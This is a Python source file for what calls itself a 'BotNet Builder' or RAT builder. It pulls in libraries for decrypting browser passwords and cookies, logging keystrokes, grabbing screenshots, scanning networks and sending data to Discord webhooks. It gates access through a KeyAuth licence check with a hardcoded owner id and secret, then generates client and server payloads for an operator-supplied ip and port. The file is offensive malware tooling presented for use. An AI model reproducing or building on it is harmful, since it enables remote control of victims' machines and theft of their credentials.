# Botnet Modules
try:
    import os
    import re
    import ssl
    import sys
    import wmi
    import json
    import hmac
    import uuid
    import socks
    import httpx
    import ctypes
    import socket
    import ipinfo
    import folium
    import shutil
    import signal
    import psutil
    import random
    import asyncio
    import zipfile
    import sqlite3
    import platform
    import requests
    import keyboard
    import win32api
    import datetime
    import threading
    import subprocess
    import cloudscraper
    import win32process
    import requests_toolbelt

    import tkinter as tk
    import undetected_chromedriver as webdriver

    from multiprocessing import Process, active_children, cpu_count, Pipe
    from discord_webhook import DiscordWebhook, DiscordEmbed
    from PyInstaller import __main__ as pyinstaller
    from requests.cookies import RequestsCookieJar
    from Crypto.Util.number import long_to_bytes
    from win32crypt import CryptUnprotectData
    from browser_history import get_history
    from binascii import hexlify, unhexlify
    from Crypto.Util.Padding import unpad
    from hashlib import sha1, pbkdf2_hmac
    from scapy.all import ARP, Ether, srp
    from pyasn1.codec.der import decoder
    from Crypto.Cipher import DES3, AES
    from pynput.mouse import Controller
    from flask_socketio import SocketIO
    from random import randint, choice
    from urllib.parse import urlparse
    from re import findall, match
    from cookies_package import *
    from tempfile import mkdtemp
    from base64 import b64decode
    from struct import unpack
    from PIL import ImageGrab
    from pathlib import Path
    from typing import Tuple
    from queue import Queue
    from pyotp import TOTP
    from tkinter import *
    from ctypes import *
    from flask import *
except: print(f"[-] Required modules not downloaded, please run 'setup.bat' to download modules and run again"); exit()



from util.plugins.keyauth import api
from util.plugins.common import *
from colorama import Fore
from cookies_package import *
from time import sleep
import maskpass
from util.create_files import create_client_payload, create_server_payload


'''
KEYAUTH CONFIGURATION
'''
def getchecksum():
    path = os.path.basename(__file__)
    # if not os.path.exists(path):
    #     path = path[:-2] + "exe"
    # md5_hash = hashlib.md5()
    # a_file = open(path,"rb")
    # content = a_file.read()
    # md5_hash.update(content)
    # digest = md5_hash.hexdigest()
    return path

keyauthapp = api(
    name = "BotNet Auth",
    ownerid = "gOtVyaoa7S",
    secret = "2addeb91d314c6531c8990f84f8aacf2ca2684a2187901dea4d71e5f8ed56da7",
    version = "1.0",
    hash_to_check = getchecksum()
)


def auth_check():
    clear()
    settitle("Authentication")
    print(auth_banner)
    ans=input(f"{Fore.CYAN}Select Option {Fore.YELLOW}>> {Fore.RESET}") 

    if ans=="1":        # Login
        clear()
        settitle("Login")
        user = input(f'Enter Username: {Fore.RESET}')
        password = maskpass.askpass()
        keyauthapp.login(user,password)

    elif ans=="2":      # Register
        clear()
        settitle("Register")
        user = input(f'Enter Username: {Fore.RESET}')
        password = input(f'Enter Password: {Fore.RESET}')
        password_confrim = input(f'Password Confirm: {Fore.RESET}')
        if password != password_confrim: print(f"{Fore.RED}Passwords do not match{Fore.RESET}"); sleep(2); auth_check()
        license = input(f'Enter License: {Fore.RESET}')
        keyauthapp.register(user,password,license)
    
    else:               # Invalid Input
        print(f"{Fore.RED}Invalid Option!{Fore.RESET}")
        sleep(2)
        auth_check()



def main_menu():
    clear()
    settitle("BotNet Builder")
    
    print(banner)
    choice = str(input(f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 

    if choice == '1':       # Create Client PayLoad
        clear()
        settitle("Creating Client Payload")
        ip = str(input(f'{Fore.CYAN}Enter ip {Fore.YELLOW}>> {Fore.RESET}'))
        port = str(input(f'{Fore.CYAN}Enter port {Fore.YELLOW}>> {Fore.RESET}'))

        create_client_payload(ip, port)
        main_menu()

    elif choice == '2':     # Create Server
        clear()
        settitle("Creating Server")
        ip = str(input(f'{Fore.CYAN}Enter ip {Fore.YELLOW}>> {Fore.RESET}'))
        port = str(input(f'{Fore.CYAN}Enter port {Fore.YELLOW}>> {Fore.RESET}'))

        host_ip = str(input(f'{Fore.CYAN}Enter webgui host ip (pc local IP){Fore.YELLOW}>> {Fore.RESET}'))
        host_port = str(input(f'{Fore.CYAN}Enter webgui host port (any port not the same as server){Fore.YELLOW}>> {Fore.RESET}'))
        
        create_server_payload(ip, port, host_ip, host_port)
        main_menu()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main_menu()


if __name__ == "__main__": 
    auth_check()
    main_menu()